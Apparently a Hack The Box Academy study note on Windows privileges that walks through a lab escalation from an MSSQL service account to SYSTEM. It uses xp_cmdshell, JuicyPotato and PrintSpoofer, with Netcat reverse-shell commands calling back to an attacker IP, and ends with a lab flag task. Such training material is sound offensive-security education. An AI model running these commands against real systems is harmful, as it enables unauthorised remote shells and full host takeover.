# 🆓 Windows User Privileges

The below diagram walks through the Windows authorization and access control process at a high level, showing, for example, the process started when a user attempts to access a securable object such as a folder on a file share.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

These rights allow users to perform tasks on the system such as logon locally or remotely, access the host from the network, shut down the server, etc.

| Setting [Constant](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) | Setting Name                                                                                                                                                                              | Standard Assignment                                     |
| ----------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------- |
| SeNetworkLogonRight                                                                             | [Access this computer from the network](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network)               | Administrators, Authenticated Users                     |
| SeRemoteInteractiveLogonRight                                                                   | [Allow log on through Remote Desktop Services](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services) | Administrators, Remote Desktop Users                    |
| SeBackupPrivilege                                                                               | [Back up files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories)                               | Administrators                                          |
| SeSecurityPrivilege                                                                             | [Manage auditing and security log](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log)                         | Administrators                                          |
| SeTakeOwnershipPrivilege                                                                        | [Take ownership of files or other objects](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)         | Administrators                                          |
| SeDebugPrivilege                                                                                | [Debug programs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs)                                                             | Administrators                                          |
| SeImpersonatePrivilege                                                                          | [Impersonate a client after authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication)       | Administrators, Local Service, Network Service, Service |
| SeLoadDriverPrivilege                                                                           | [Load and unload device drivers](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)                             | Administrators                                          |
| SeRestorePrivilege                                                                              | [Restore files and directories](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories)                               | Administrators                                          |

Typing the command `whoami /priv` will give you a listing of all user rights assigned to your current user.

```powershell-session
PS C:\htb> whoami /priv
<SNIP>
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
<SNIP>
```

When a privilege is listed for our account in the `Disabled` state, it means that our account has the specific privilege assigned. Still, it cannot be used in an access token to perform the associated actions until it is enabled. we need some scripting to help us out.

this PowerShell [script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts/Enable-Privilege.ps1) which can be used to enable certain privileges, or this [script](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/) which can be used to adjust token privileges.

## SeImpersonate and SeAssignPrimaryToken

the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.  This [paper](https://github.com/hatRiot/token-priv/blob/master/abusing\_token\_eop\_1.0.txt) is worth reading for further details on token impersonation attacks.

### SeImpersonate Example - JuicyPotato

In this scenario, the SQL Service service account is running in the context of the default `mssqlserver` account. Imagine we have achieved command execution as this user using `xp_cmdshell` using a set of credentials obtained in a `logins.sql` file on a file share using the `Snaffler` tool.

Using the credentials `sql_dev:Str0ng_P@ssw0rd!` we connect to the SQL instance:

```shell-session
ElFelixi0@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
SQL>
```

Next, we must enable the `xp_cmdshell` stored procedure to run operating system commands.

```shell-session
SQL> enable_xp_cmdshell
```

we can confirm that we are indeed running in the context of a SQL Server service account ->

```shell-session
SQL> xp_cmdshell whoami
nt service\mssql$sqlexpress01
```

let's check what privileges the service account has been granted.

```shell-session
SQL> xp_cmdshell whoami /priv 
<SNIP>
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
```

&#x20;[JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken`

first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. Next, stand up a Netcat listener on port 8443

```shell-session
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

An don our listener ->

```shell-session
ElFelixi0@htb[/htb]$ sudo nc -lnvp 8443
<SNIP>
C:\Windows\system32>whoami
nt authority\system
```

### PrintSpoofer and RoguePotato

JuicyPotato **doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards**. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges and gain `NT AUTHORITY\SYSTEM` level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool

&#x20;Again, connect with `mssqlclient.py` and use the tool with the `-c` argument to execute a command. Here, using `nc.exe` to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).

```shell-session
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

and if everything works fine our listener will catch this&#x20;

```shell-session
ElFelixi0@htb[/htb]$ nc -lnvp 8443

C:\Windows\system32>whoami
nt authority\system
```

_**Escalate privileges using one of the methods shown in this section. Submit the contents of the flag file located at c:\Users\Administrator\Desktop\SeImpersonate\flag.txt**_

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
